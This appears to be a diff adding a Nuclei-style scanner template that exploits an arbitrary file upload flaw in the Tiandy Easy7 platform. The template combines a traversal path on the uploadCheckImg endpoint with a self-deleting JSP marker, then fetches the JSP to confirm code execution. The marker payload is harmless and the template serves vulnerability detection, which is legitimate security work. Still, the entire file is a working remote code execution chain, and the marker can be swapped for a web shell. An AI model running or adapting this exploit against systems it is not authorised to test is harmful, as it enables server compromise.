@@ -1,0 +1,50 @@
+id: poc-yaml-tiandy-easy7-imp-uploadcheckimg-anyfile-upload
+info:
+  name: Tiandy Easy7 uploadCheckImg Any File Upload
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+  description: |
+    Exploits a file upload vulnerability in Tiandy Easy7 management platform allowing
+    arbitrary file upload and code execution.
+
+variables:
+  t1: "{{rand_base(7)}}"
+  t2: "{{base64(t1)}}"
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "{{BaseURL}}/Easy7/rest/file/uploadCheckImg?fileName={{t1}}.jsp&uploadPicturePath=/../../root/tiandy/data/"
+    headers:
+      Content-Type: "multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj"
+    body: |-
+      ------WebKitFormBoundaryFfJZ4PlAZBixjELj
+      Content-Disposition: form-data; name="file"; filename="{{t1}}.txt"
+      Content-Type: image/jpeg
+
+      <% out.print("{{t2}}");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+      ------WebKitFormBoundaryFfJZ4PlAZBixjELj--
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - ".jsp"
+        part: body
+
+  - id: verify-upload
+    method: GET
+    path:
+      - "{{BaseURL}}/imagelive/{{t1}}.jsp"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{t2}}"
+        part: body
